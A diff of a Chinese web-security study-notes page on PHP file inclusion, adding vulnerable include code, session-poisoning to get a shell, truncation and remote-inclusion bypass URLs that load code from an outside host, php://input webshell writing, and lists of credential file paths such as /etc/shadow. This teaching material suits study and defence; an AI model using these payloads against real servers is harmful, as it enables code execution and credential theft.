@@ -8,7 +8,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <title>4.9. 文件包含 &mdash; Web安全学习笔记 1.0 documentation</title>
+  <title>4.10. 文件包含 &mdash; Web安全学习笔记 1.0 documentation</title>
   
 
   
@@ -35,8 +35,8 @@
   <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
-    <link rel="next" title="4.10. XXE" href="xxe.html" />
-    <link rel="prev" title="4.8. 文件上传" href="fileupload.html" /> 
+    <link rel="next" title="4.11. XXE" href="xxe.html" />
+    <link rel="prev" title="4.9. 文件上传" href="fileupload.html" /> 
 </head>
 
 <body class="wy-body-for-nav">
@@ -90,36 +90,34 @@
 <li class="toctree-l1"><a class="reference internal" href="../network/index.html">2. 计算机网络与协议</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../info/index.html">3. 信息收集</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="index.html">4. 常见漏洞攻防</a><ul class="current">
-<li class="toctree-l2"><a class="reference internal" href="sql/index.html">4.1. SQL注入</a></li>
-<li class="toctree-l2"><a class="reference internal" href="xss/index.html">4.2. XSS</a></li>
-<li class="toctree-l2"><a class="reference internal" href="csrf.html">4.3. CSRF</a></li>
-<li class="toctree-l2"><a class="reference internal" href="ssrf.html">4.4. SSRF</a></li>
-<li class="toctree-l2"><a class="reference internal" href="cmdinjection.html">4.5. 命令注入</a></li>
-<li class="toctree-l2"><a class="reference internal" href="pathtraversal.html">4.6. 目录穿越</a></li>
-<li class="toctree-l2"><a class="reference internal" href="fileread.html">4.7. 文件读取</a></li>
-<li class="toctree-l2"><a class="reference internal" href="fileupload.html">4.8. 文件上传</a></li>
-<li class="toctree-l2 current"><a class="current reference internal" href="#">4.9. 文件包含</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#id2">4.9.1. 基础</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#sink">4.9.2. 触发Sink</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#id3">4.9.3. 绕过技巧</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#url">4.9.3.1. url编码绕过</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id4">4.9.3.2. 特殊字符绕过</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id5">4.9.3.3. %00截断</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id6">4.9.3.4. 长度截断</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id7">4.9.3.5. 伪协议绕过</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owasp.html">4.1. 解读2017OWASPTop10漏洞体系</a></li>
+<li class="toctree-l2"><a class="reference internal" href="sql/index.html">4.2. SQL注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xss/index.html">4.3. XSS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="csrf.html">4.4. CSRF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ssrf.html">4.5. SSRF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="cmdinjection.html">4.6. 命令注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="pathtraversal.html">4.7. 目录穿越</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fileread.html">4.8. 文件读取</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fileupload.html">4.9. 文件上传</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">4.10. 文件包含</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#id2">4.10.1. 基础</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#sink">4.10.2. 触发Sink</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id3">4.10.3. 本地文件包含漏洞</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id4">4.10.4. 远程文件包含漏洞</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#url">4.10.5. url编码绕过</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id5">4.10.6. 伪协议绕过</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id6">4.10.7. 常见的敏感信息路径：</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id7">4.10.8. 参考链接</a></li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="#id8">4.9.4. 参考链接</a></li>
-</ul>
-</li>
-<li class="toctree-l2"><a class="reference internal" href="xxe.html">4.10. XXE</a></li>
-<li class="toctree-l2"><a class="reference internal" href="ssti.html">4.11. 模版注入</a></li>
-<li class="toctree-l2"><a class="reference internal" href="xpath.html">4.12. Xpath注入</a></li>
-<li class="toctree-l2"><a class="reference internal" href="logic.html">4.13. 逻辑漏洞 / 业务漏洞</a></li>
-<li class="toctree-l2"><a class="reference internal" href="config.html">4.14. 配置安全</a></li>
-<li class="toctree-l2"><a class="reference internal" href="middleware/index.html">4.15. 中间件</a></li>
-<li class="toctree-l2"><a class="reference internal" href="webcache.html">4.16. Web Cache欺骗攻击</a></li>
-<li class="toctree-l2"><a class="reference internal" href="httpSmuggling.html">4.17. HTTP 请求走私</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xxe.html">4.11. XXE</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ssti.html">4.12. 模版注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xpath.html">4.13. Xpath注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="logic.html">4.14. 逻辑漏洞 / 业务漏洞</a></li>
+<li class="toctree-l2"><a class="reference internal" href="config.html">4.15. 配置安全</a></li>
+<li class="toctree-l2"><a class="reference internal" href="middleware/index.html">4.16. 中间件</a></li>
+<li class="toctree-l2"><a class="reference internal" href="webcache.html">4.17. Web Cache欺骗攻击</a></li>
+<li class="toctree-l2"><a class="reference internal" href="httpSmuggling.html">4.18. HTTP 请求走私</a></li>
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="../language/index.html">5. 语言与框架</a></li>
@@ -176,7 +174,7 @@
         
           <li><a href="index.html"><span class="section-number">4. </span>常见漏洞攻防</a> &raquo;</li>
         
-      <li><span class="section-number">4.9. </span>文件包含</li>
+      <li><span class="section-number">4.10. </span>文件包含</li>
     
     
       <li class="wy-breadcrumbs-aside">
@@ -196,11 +194,19 @@
            <div itemprop="articleBody">
             
   <div class="section" id="id1">
-<h1><span class="section-number">4.9. </span>文件包含<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h1>
+<h1><span class="section-number">4.10. </span>文件包含<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="id2">
-<h2><span class="section-number">4.9.1. </span>基础<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h2>
-<p>常见的文件包含漏洞的形式为 <code class="docutils literal notranslate"><span class="pre">&lt;?php</span> <span class="pre">include(&quot;inc/&quot;</span> <span class="pre">.</span> <span class="pre">$_GET['file']);</span> <span class="pre">?&gt;</span></code></p>
-<p>考虑常用的几种包含方式为</p>
+<h2><span class="section-number">4.10.1. </span>基础<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h2>
+<p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
+    $filename  = $_GET[&#39;filename&#39;];
+    include($filename);
+?&gt;
+</pre></div>
+</div>
+<p>例如：
+$_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$_GET[‘filename’]的值，执行非预期的操作。</p>
+<p>考虑常用的几种包含方式为:</p>
 <ul class="simple">
 <li><p>同目录包含 <code class="docutils literal notranslate"><span class="pre">file=.htaccess</span></code></p></li>
 <li><p>目录遍历 <code class="docutils literal notranslate"><span class="pre">?file=../../../../../../../../../var/lib/locate.db</span></code></p></li>
@@ -210,10 +216,10 @@
 <p>其中日志可以使用SSH日志或者Web日志等多种日志来源测试</p>
 </div>
 <div class="section" id="sink">
-<h2><span class="section-number">4.9.2. </span>触发Sink<a class="headerlink" href="#sink" title="Permalink to this headline">¶</a></h2>
+<h2><span class="section-number">4.10.2. </span>触发Sink<a class="headerlink" href="#sink" title="Permalink to this headline">¶</a></h2>
 <ul class="simple">
 <li><dl class="simple">
-<dt>PHP</dt><dd><ul>
+<dt>PHP文件包含函数有以下四种</dt><dd><ul>
 <li><dl class="simple">
 <dt>include</dt><dd><ul>
 <li><p>在包含过程中出错会报错，不影响执行后续语句</p></li>
@@ -243,45 +249,190 @@
 </ul>
 </div>
 <div class="section" id="id3">
-<h2><span class="section-number">4.9.3. </span>绕过技巧<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
-<p>常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式</p>
-<div class="section" id="url">
-<h3><span class="section-number">4.9.3.1. </span>url编码绕过<a class="headerlink" href="#url" title="Permalink to this headline">¶</a></h3>
-<p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</p>
+<h2><span class="section-number">4.10.3. </span>本地文件包含漏洞<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
+<ul>
+<li><p>无限制本地文件包含漏洞</p></li>
+<li><dl>
+<dt>session文件包含漏洞</dt><dd><p>利用条件：session的存储位置可以获取。(phpinfo()或猜测,如linux下默认存储在/var/lib/php/session目录下)
+示例：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
+    session_start();
+    $ctfs=$_GET[&#39;ctfs&#39;];
+    $_SESSION[&quot;username&quot;]=$ctfs;
+?&gt;
+</pre></div>
+</div>
+<p>漏洞分析:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>此php会将获取到的GET型ctfs变量的值存入到session中。
+当访问http://www.ctfs-wiki/session.php?ctfs=ctfs 后，会在/var/lib/php/session
+目录下存储session的值。
+session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。
+</pre></div>
+</div>
+<p><img alt="fileincludesessionid" src="../_images/fileincludesessionid.jpg" /></p>
+<p>所以session的文件名为sess_akp79gfiedh13ho11i6f3sm6s6。
+服务器的/var/lib/php/session目录下此文件内容为：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">username</span><span class="o">|</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s2">&quot;ctfs&quot;</span><span class="p">;</span>
+<span class="p">[</span><span class="n">root</span><span class="nd">@c21336db44d2</span> <span class="n">session</span><span class="p">]</span><span class="c1"># cat sess_akp79gfiedh13ho11i6f3sm6s6</span>
+<span class="n">username</span><span class="o">|</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s2">&quot;ctfs&quot;</span>
+</pre></div>
+</div>
+<p>漏洞利用:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过
+ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。
+当访问http://www.ctfs-wiki/session.php?ctfs=&lt;?php phpinfo();?&gt;后，会在/var/lib/php/session目录下
+存储session的值。
+</pre></div>
+</div>
+</dd>
+</dl>
+</li>
+<li><dl>
+<dt>有限制本地文件包含漏洞绕过</dt><dd><ul>
+<li><dl>
+<dt>%00截断</dt><dd><p>测试代码：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
+    $filename  = $_GET[&#39;filename&#39;];
+    include($filename . &quot;.html&quot;);
+?&gt;
+</pre></div>
+</div>
+</dd>
+</dl>
+<p><code class="docutils literal notranslate"><span class="pre">http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</span></code></p>
+</li>
+<li><dl>
+<dt>路径长度截断</dt><dd><p>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Windows下目录最大长度为256字节，超出的部分会被丢弃；
+Linux下目录最大长度为4096字节，超出的部分会被丢弃。
+</pre></div>
+</div>
+<p>测试代码：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
+    $filename  = $_GET[&#39;filename&#39;];
+    include($filename . &quot;.html&quot;);
+?&gt;
+</pre></div>
+</div>
+<p>EXP:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
+</pre></div>
+</div>
+</dd>
+</dl>
+</li>
+<li><dl>
+<dt>点号截断</dt><dd><p>条件：windows OS，点号需要长于256</p>
+<p>测试代码：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
+    $filename  = $_GET[&#39;filename&#39;];
+    include($filename . &quot;.html&quot;);
+?&gt;
+</pre></div>
+</div>
+<p>EXP:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
+</pre></div>
+</div>
+</dd>
+</dl>
+</li>
+</ul>
+</dd>
+</dl>
+</li>
+</ul>
 </div>
 <div class="section" id="id4">
-<h3><span class="section-number">4.9.3.2. </span>特殊字符绕过<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h3>
+<h2><span class="section-number">4.10.4. </span>远程文件包含漏洞<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h2>
+<p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，
+如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
 <ul class="simple">
-<li><p>某些情况下，读文件支持使用Shell通配符，如 <code class="docutils literal notranslate"><span class="pre">?</span></code> <code class="docutils literal notranslate"><span class="pre">*</span></code> 等</p></li>
-<li><p>url中 使用 <code class="docutils literal notranslate"><span class="pre">?</span></code> <code class="docutils literal notranslate"><span class="pre">#</span></code> 可能会影响include包含的结果</p></li>
-<li><p>某些情况下，unicode编码不同但是字形相近的字符有同一个效果</p></li>
+<li><p>无限制远程文件包含漏洞</p></li>
+<li><dl class="simple">
+<dt>有限制远程文件包含漏洞绕过</dt><dd><ul>
+<li><dl class="simple">
+<dt>问号绕过</dt><dd><p><code class="docutils literal notranslate"><span class="pre">&lt;?php</span> <span class="pre">include($_GET['filename']</span> <span class="pre">.</span> <span class="pre">&quot;.html&quot;);</span> <span class="pre">?&gt;</span></code> 代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀，问号绕过如下：
+<code class="docutils literal notranslate"><span class="pre">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</span></code></p>
+</dd>
+</dl>
+</li>
+<li><dl class="simple">
+<dt>#号绕过</dt><dd><p><code class="docutils literal notranslate"><span class="pre">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23</span></code></p>
+</dd>
+</dl>
+</li>
+<li><dl class="simple">
+<dt>空格绕过</dt><dd><p><code class="docutils literal notranslate"><span class="pre">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%20</span></code></p>
+</dd>
+</dl>
+</li>
 </ul>
+</dd>
+</dl>
+</li>
+</ul>
+</div>
+<div class="section" id="url">
+<h2><span class="section-number">4.10.5. </span>url编码绕过<a class="headerlink" href="#url" title="Permalink to this headline">¶</a></h2>
+<p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过。</p>
 </div>
 <div class="section" id="id5">
-<h3><span class="section-number">4.9.3.3. </span>%00截断<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h3>
-<p>几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。</p>
-</div>
-<div class="section" id="id6">
-<h3><span class="section-number">4.9.3.4. </span>长度截断<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h3>
-<p>Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。</p>
-<p>msdn定义 <code class="docutils literal notranslate"><span class="pre">#define</span> <span class="pre">MAX_PATH</span> <span class="pre">260</span></code>，其中第260个字符为字符串结尾的 <code class="docutils literal notranslate"><span class="pre">\0</span></code> ，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。</p>
-<p>获取最长文件路径长度：getconf PATH_MAX /root 得到4096
-获取最长文件名：getconf NAME_MAX /root 得到255</p>
-<p>那么在长度有限的时候，<code class="docutils literal notranslate"><span class="pre">././././</span></code> (n个) 的形式就可以通过这个把路径爆掉</p>
-<p>在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8</p>
-</div>
-<div class="section" id="id7">
-<h3><span class="section-number">4.9.3.5. </span>伪协议绕过<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h3>
+<h2><span class="section-number">4.10.6. </span>伪协议绕过<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h2>
 <ul class="simple">
-<li><p>远程包含: 要求 <code class="docutils literal notranslate"><span class="pre">allow_url_fopen=On</span></code> 且 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code> ， payload为 <code class="docutils literal notranslate"><span class="pre">?file=[http|https|ftp]://websec.wordpress.com/shell.txt</span></code> 的形式</p></li>
-<li><p>PHP input: 把payload放在POST参数中作为包含的文件，要求 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code> ，payload为 <code class="docutils literal notranslate"><span class="pre">?file=php://input</span></code> 的形式</p></li>
-<li><p>Base64: 使用Base64伪协议读取文件，payload为 <code class="docutils literal notranslate"><span class="pre">?file=php://filter/convert.base64-encode/resource=index.php</span></code> 的形式</p></li>
-<li><p>data: 使用data伪协议读取文件，payload为 <code class="docutils literal notranslate"><span class="pre">?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</span></code> 的形式，要求 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code></p></li>
+<li><dl class="simple">
+<dt>PHP input: 把payload放在POST参数中作为包含的文件，要求 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code> ，payload为 <code class="docutils literal notranslate"><span class="pre">?file=php://input</span></code> 的形式</dt><dd><ul>
+<li><dl class="simple">
+<dt>命令执行</dt><dd><p><img alt="fileincludecommand" src="../_images/fileincludecommand.jpg" /></p>
+</dd>
+</dl>
+</li>
+<li><dl class="simple">
+<dt>写入webshell</dt><dd><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。
+<img alt="fileincludemuma" src="../_images/fileincludemuma.jpg" /></p>
+</dd>
+</dl>
+</li>
+</ul>
+</dd>
+</dl>
+</li>
+<li><dl class="simple">
+<dt>Base64伪协议读取文件</dt><dd><p>payload为 <code class="docutils literal notranslate"><span class="pre">?file=php://filter/convert.base64-encode/resource=index.php</span></code></p>
+</dd>
+</dl>
+</li>
+<li><dl class="simple">
+<dt>data伪协议读取文件内容</dt><dd><p>payload为 <code class="docutils literal notranslate"><span class="pre">?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</span></code> 的形式，要求 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code></p>
+</dd>
+</dl>
+</li>
 </ul>
 </div>
+<div class="section" id="id6">
+<h2><span class="section-number">4.10.7. </span>常见的敏感信息路径：<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h2>
+<p>Windows系统</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">c</span><span class="p">:</span>\<span class="n">boot</span><span class="o">.</span><span class="n">ini</span> <span class="o">//</span> <span class="n">查看系统版本</span>
+<span class="n">c</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">system32</span>\<span class="n">inetsrv</span>\<span class="n">MetaBase</span><span class="o">.</span><span class="n">xml</span> <span class="o">//</span> <span class="n">IIS配置文件</span>
+<span class="n">c</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">repair</span>\<span class="n">sam</span> <span class="o">//</span> <span class="n">存储Windows系统初次安装的密码</span>
+<span class="n">c</span><span class="p">:</span>\<span class="n">ProgramFiles</span>\<span class="n">mysql</span>\<span class="n">my</span><span class="o">.</span><span class="n">ini</span> <span class="o">//</span> <span class="n">MySQL配置</span>
+<span class="n">c</span><span class="p">:</span>\<span class="n">ProgramFiles</span>\<span class="n">mysql</span>\<span class="n">data</span>\<span class="n">mysql</span>\<span class="n">user</span><span class="o">.</span><span class="n">MYD</span> <span class="o">//</span> <span class="n">MySQL</span> <span class="n">root密码</span>
+<span class="n">c</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">php</span><span class="o">.</span><span class="n">ini</span> <span class="o">//</span> <span class="n">php</span> <span class="n">配置信息</span>
+</pre></div>
 </div>
-<div class="section" id="id8">
-<h2><span class="section-number">4.9.4. </span>参考链接<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h2>
+<p>Linux/Unix系统</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">//</span> <span class="n">账户信息</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span> <span class="o">//</span> <span class="n">账户密码文件</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span> <span class="n">Apache2默认配置文件</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">extra</span><span class="o">/</span><span class="n">httpd</span><span class="o">-</span><span class="n">vhost</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span> <span class="n">虚拟网站配置</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">php5</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php</span><span class="o">.</span><span class="n">ini</span> <span class="o">//</span> <span class="n">PHP相关配置</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span> <span class="n">Apache配置文件</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">my</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span> <span class="n">mysql</span> <span class="n">配置文件</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id7">
+<h2><span class="section-number">4.10.8. </span>参考链接<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h2>
 <ul class="simple">
 <li><p><a class="reference external" href="https://www.cdxy.me/?p=752">Exploit with PHP Protocols</a></p></li>
 <li><p><a class="reference external" href="https://highon.coffee/blog/lfi-cheat-sheet/">lfi cheat sheet</a></p></li>
@@ -297,10 +448,10 @@
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="xxe.html" class="btn btn-neutral float-right" title="4.10. XXE" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+        <a href="xxe.html" class="btn btn-neutral float-right" title="4.11. XXE" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
       
       
-        <a href="fileupload.html" class="btn btn-neutral float-left" title="4.8. 文件上传" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+        <a href="fileupload.html" class="btn btn-neutral float-left" title="4.9. 文件上传" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
       
     </div>
   
